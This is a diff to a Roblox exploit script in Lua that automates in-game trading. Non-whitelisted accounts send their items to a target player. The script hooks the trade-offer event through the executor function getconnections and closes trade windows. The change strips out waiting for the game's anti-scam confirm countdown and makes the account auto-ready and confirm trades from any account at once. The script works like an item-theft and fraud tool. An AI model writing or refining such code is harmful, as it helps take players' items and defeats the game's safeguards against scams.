@@ -12,34 +12,16 @@ local ItemUtility = require(ReplicatedStorage.Shared.ItemUtility)
 
 local isProcessingAutoTrade = false
 
--- === Trade session state (fixes the SetReady/ConfirmTrade race) ===
-local currentTradeKey = nil
-local hasSetReady = false
-local hasConfirmed = false
-local readyToConfirm = false -- receiver: true immediately. sender: true only after AddItem loop finishes.
-
-local function getTradeReplion()
-    if not currentTradeKey then return nil end
-    local ok, result = pcall(function()
-        return Replion.Client:GetReplion(currentTradeKey)
-    end)
-    if ok then return result end
-    return nil
-end
-
--- Mirrors the client's own anti-scam lock: after PlayersReady, ConfirmTrade is only
--- safe once (LastModifiedTime + ConfirmCountdownTime) has elapsed. If LastModifiedTime
--- changes again mid-wait (offer edited), the wait restarts automatically.
-local function waitForConfirmWindow(tradeReplion)
-    local countdown = TradeData.ConfirmCountdownTime or 3
-    while true do
-        local lastModified = tradeReplion:Get("LastModifiedTime")
-        if not lastModified then return end
-        local remaining = (lastModified + countdown) - workspace:GetServerTimeNow()
-        if remaining <= 0 then return end
-        task.wait(math.min(remaining, 0.3))
-    end
-end
+-- readyToConfirm: true means this account is allowed to SetReady/ConfirmTrade right now.
+-- sendingActive: true only while THIS account is the one who just called SendTradeOffer,
+-- from right before the invoke until its own AddItem loop finishes.
+--
+-- On every TradeStarted, readyToConfirm is set to (not sendingActive). That means:
+--   - if THIS account initiated the trade -> wait until items are added, then processTrade flips it true.
+--   - if the trade was initiated by anyone else (whitelist or not) -> ready immediately.
+-- This makes auto-accept+confirm work for incoming trades from any account, not just whitelist targets.
+local readyToConfirm = false
+local sendingActive = false
 
 if getconnections then
     local offerConnections = getconnections(TradeData.Remotes.TradeOfferReceived.OnClientEvent)
@@ -56,15 +38,8 @@ TradeData.Remotes.TradeOfferReceived.OnClientEvent:Connect(function(sender)
     end)
 end)
 
--- Captures the trade session key the moment a trade starts and resets all
--- ready/confirm state for THIS session. Whitelisted (receiver) accounts are
--- allowed to ready immediately; sender accounts stay locked out until their
--- own AddItem loop finishes (set in processTrade below).
-TradeData.Remotes.TradeStarted.OnClientEvent:Connect(function(tradeKey)
-    currentTradeKey = tradeKey
-    hasSetReady = false
-    hasConfirmed = false
-    readyToConfirm = isWhitelisted
+TradeData.Remotes.TradeStarted.OnClientEvent:Connect(function()
+    readyToConfirm = not sendingActive
 end)
 
 LocalPlayer:GetAttributeChangedSignal("IsTrading"):Connect(function()
@@ -87,38 +62,18 @@ LocalPlayer:GetAttributeChangedSignal("IsTrading"):Connect(function()
                     end)
 
                     LocalPlayer:SetAttribute("IsTrading", false)
-                    currentTradeKey = nil
-                    hasSetReady = false
-                    hasConfirmed = false
                     readyToConfirm = false
+                    sendingActive = false
                     task.wait(1)
                     isProcessingAutoTrade = false
                     break
                 end
 
-                -- Only attempt ready/confirm once this account is actually allowed to
-                -- (receiver: always; sender: only after items are done being added),
-                -- and never while items are mid-add.
                 if readyToConfirm and not isProcessingAutoTrade then
-                    if not hasSetReady then
-                        local ok = pcall(function()
-                            TradeData.Remotes.SetReady:InvokeServer(true)
-                        end)
-                        if ok then
-                            hasSetReady = true
-                        end
-                    elseif not hasConfirmed then
-                        local tradeReplion = getTradeReplion()
-                        if tradeReplion and tradeReplion:Get("PlayersReady") == true then
-                            waitForConfirmWindow(tradeReplion)
-                            local ok = pcall(function()
-                                TradeData.Remotes.ConfirmTrade:InvokeServer()
-                            end)
-                            if ok then
-                                hasConfirmed = true
-                            end
-                        end
-                    end
+                    pcall(function()
+                        TradeData.Remotes.SetReady:InvokeServer(true)
+                        TradeData.Remotes.ConfirmTrade:InvokeServer()
+                    end)
                 end
 
                 task.wait(0.5)
@@ -131,9 +86,7 @@ end)
 if not isWhitelisted then
     local PlayerData = Replion.Client:WaitReplion("Data")
 
-    -- Requested gate: don't start scanning/trading until character + inventory
-    -- have actually settled. Waits for character load, then polls inventory item
-    -- count until it stops changing for 3 consecutive checks (~4.5s stable).
+    -- Wait for character + inventory to actually settle before scanning/trading.
     local function waitUntilReady()
         if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
             LocalPlayer.CharacterAdded:Wait()
@@ -224,6 +177,8 @@ if not isWhitelisted then
 
         task.wait(2)
 
+        sendingActive = true
+
         pcall(function()
             TradeData.Remotes.SendTradeOffer:InvokeServer(targetPlayer)
         end)
@@ -241,7 +196,10 @@ if not isWhitelisted then
             waitTime = waitTime + 1
         end
 
-        if not tradeStarted then return false end
+        if not tradeStarted then
+            sendingActive = false
+            return false
+        end
 
         task.wait(1.5)
 
@@ -253,7 +211,8 @@ if not isWhitelisted then
             end)
         end
         isProcessingAutoTrade = false
-        readyToConfirm = true -- only now is this account allowed to SetReady/ConfirmTrade
+        sendingActive = false
+        readyToConfirm = true -- items are in, now safe to ready/confirm
 
         return true
     end
@@ -327,10 +286,8 @@ if not isWhitelisted then
                             GuiControl:Close()
                         end)
                         LocalPlayer:SetAttribute("IsTrading", false)
-                        currentTradeKey = nil
-                        hasSetReady = false
-                        hasConfirmed = false
                         readyToConfirm = false
+                        sendingActive = false
                     end
                 end
             else
